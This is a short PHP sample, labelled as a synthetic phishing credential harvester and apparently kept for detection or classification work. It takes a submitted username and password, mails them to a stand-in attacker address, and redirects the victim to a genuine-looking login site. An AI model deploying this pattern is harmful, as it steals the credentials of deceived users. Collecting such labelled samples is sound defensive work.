<?php
// Synthetic sample - phishing credential harvester (NON-FUNCTIONAL, fake recipient)
// Family: credential POST -> external exfil
$user = $_POST['username'];
$pass = $_POST['password'];
$body = "login: $user\npassword: $pass";
mail("collector@attacker.example", "creds", $body);
header("Location: https://accounts.example.com/");
?>
